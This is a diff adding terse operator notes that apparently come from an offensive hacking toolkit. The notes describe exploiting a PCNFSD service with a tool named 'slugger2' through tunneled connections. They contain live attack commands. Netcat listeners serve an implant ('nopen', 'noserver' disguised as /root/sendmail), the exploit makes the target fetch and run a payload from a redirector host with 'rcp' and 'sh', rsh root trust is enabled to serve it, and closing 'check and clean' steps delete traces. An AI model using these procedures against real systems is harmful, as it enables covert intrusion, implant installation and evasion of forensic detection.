@@ -1,0 +1,77 @@
+window 1)
+-tunnel
+r 443
+u ###PCNFSDPORT### ###TARGETIP###
+
+window 2)
+nc -vv -l -p 514 < nopen.t # edit nopen.t, note the size, subtract 14 from the actual size and replace 366 with the new size 
+
+window 3)
+-rtun 514 127.0.0.1 
+
+window 4)
+nc -vv -l -p 443 < sendmail.uu 
+
+window 5)
+./slugger2 ###TARGETIP### ###TARGETPORT### "cd ..
+cd ..
+cd ..
+cd ..
+cd tmp
+rcp -p ###PI###:t .t
+sh .t
+"
+
+An alternative to the above is to use rcp. Get rid of the nulls and header
+info from nopen.t first. 
+
+For direct connects, no problem. Through a PI, seems to be a problem.
+
+1)
+vi ~/.rhosts
+enter FQDN of jumpoff/pi
+
+2)
+echo rsh >> /etc/securetty
+
+3)
+cat /etc/xinetd.d/rsh 
+# default: on
+# description: The rshd server is the server for the rcmd(3) routine and, \
+#    consequently, for the rsh(1) program.  The server provides \
+#    remote execution facilities with authentication based on \
+#    privileged port numbers from trusted hosts.
+service shell
+{
+     disable = no
+     socket_type  = stream
+     wait   = no
+     user   = root
+     log_on_success   += USERID
+     log_on_failure   += USERID
+     server   = /usr/sbin/in.rshd
+}
+
+4)
+/etc/init.d/xinetd start
+
+
+TARGETPORT=###TARGETPORT###
+cp ../up/noserver /root/sendmail
+file /root/sendmail
+cp ../bin/pcnfsd.t /root/t
+vi /root/t
+./slugger2 ###TARGETIP### "rcp -p ###LOCALIP###:t .t
+sh .t"
+
+
+afterwards, check and clean:
+
+ls -lart /var/spool/pcnfs
+
+ls -al /
+
+ls -al /etc/rc3.d
+
+rm -- -p
+rm .t
